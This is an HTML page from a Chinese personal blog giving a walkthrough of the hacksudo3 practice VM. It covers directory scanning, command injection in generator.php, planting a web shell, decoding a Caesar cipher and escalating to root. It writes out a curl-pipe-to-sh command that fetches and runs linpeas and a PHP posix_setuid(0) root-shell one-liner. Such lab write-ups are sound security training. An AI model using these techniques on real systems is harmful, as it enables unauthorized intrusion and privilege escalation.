@@ -1,0 +1,248 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>hacksudo3 通关详解 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>hacksudo3 通关详解</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/7
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>一开始桥接错网卡了 搞了半天 改回来就行了</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/77b085a4965945089e4efd752219fcd4.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/6a78d32b8bc746239c8cf3583c4ce9b4.png" alt="在这里插入图片描述"><br>大概看了一眼没什么有用的信息 然后对着login.php跑了一下弱口令 sqlmap<br>都没跑出来 那么利用点应该不在这 考虑到之前有过dirsearch字典太小扫不到东西的经历<br>换个gobuster扫一下<br><img src="https://img-blog.csdnimg.cn/3dee063911db44ce96cbcc491d0ac026.png" alt="在这里插入图片描述"><br>先看看generator.php<br><img src="https://img-blog.csdnimg.cn/a9025eb98b0445379fc124f0e753ffbe.png" alt="在这里插入图片描述">随便填点东西执行一下 感觉像命令注入<br><img src="https://img-blog.csdnimg.cn/c51178f60f214846af55040ad8f77d83.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bb57ad44e67047758e2f5fe366003b4b.png" alt="在这里插入图片描述"><br>尝试弹个shell<br>没成功<br>那就写了个一句话 然后用蚁剑传shell<br><img src="https://img-blog.csdnimg.cn/aeaa9d7243ee4884879b9e01449decf5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda42949852141f48c83230df31ecc10.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6a6885383b3d40bfa310e0efe06c5769.png" alt="在这里插入图片描述"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/9ea476d0bf444708a1febdf92d6655e2.png" alt="在这里插入图片描述"></p>
+<p>看看还有没有用户,有可能待会会切过去<br><img src="https://img-blog.csdnimg.cn/00a360113c734409afbdee01f52b3dfd.png" alt="在这里插入图片描述"><br>用linpeas枚举脆弱性<br><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br><img src="https://img-blog.csdnimg.cn/c864be3fe2cb4dbc8033971314fc5cde.png" alt="在这里插入图片描述"></p>
+<p>没看见特别显眼的<br><img src="https://img-blog.csdnimg.cn/7636f4070eaf40b58bcd57050d9334dd.png" alt="在这里插入图片描述"><br>版本过高<br>考虑到有个hacksudo的用户<br>再收集一波信息看看能不能切过去<br>发现有个hacksudo的文件 <img src="https://img-blog.csdnimg.cn/50502f6f887c49aebd25668c9bc0def7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7389c521ab462185fdd0474acd218e.png" alt="在这里插入图片描述"><br>有加密 一眼凯撒<br><img src="https://img-blog.csdnimg.cn/9d1b8d0b91174a96ba8c3195570fcecb.png" alt="试试"><br><img src="https://img-blog.csdnimg.cn/5d7b8c1ddb5c49a38264fce2174de9b9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0b55f6c69e6643899def33c14f9a1253.png" alt="在这里插入图片描述"></p>
+<p>没有sudo权限<br><img src="https://img-blog.csdnimg.cn/4b97b8f4a9494eefb8c1be96d0ff31cc.png" alt="在这里插入图片描述"><br>在work路径下发现sh文件<br>没执行权限<br>也没看见相关的计划任务<br>再传个linpeas枚举<br><img src="https://img-blog.csdnimg.cn/dfa91d083f1b478ab029c730db82e9b4.png" alt="在这里插入图片描述"><br>可以lxd提权<br><img src="https://img-blog.csdnimg.cn/696ebe4ba82647f79f404a46cc5753b1.png" alt="在这里插入图片描述"><br>也可以view 或 php提权<br>这里用php提权</p>
+<pre><code class="bash">CMD=&quot;/bin/sh&quot;
+./home/hacksudo/locker/php -r &quot;posix_setuid(0); system(&#39;$CMD&#39;);&quot;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e187ecf8f2a44c7fbc974ae3193d7547.png" alt="在这里插入图片描述"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
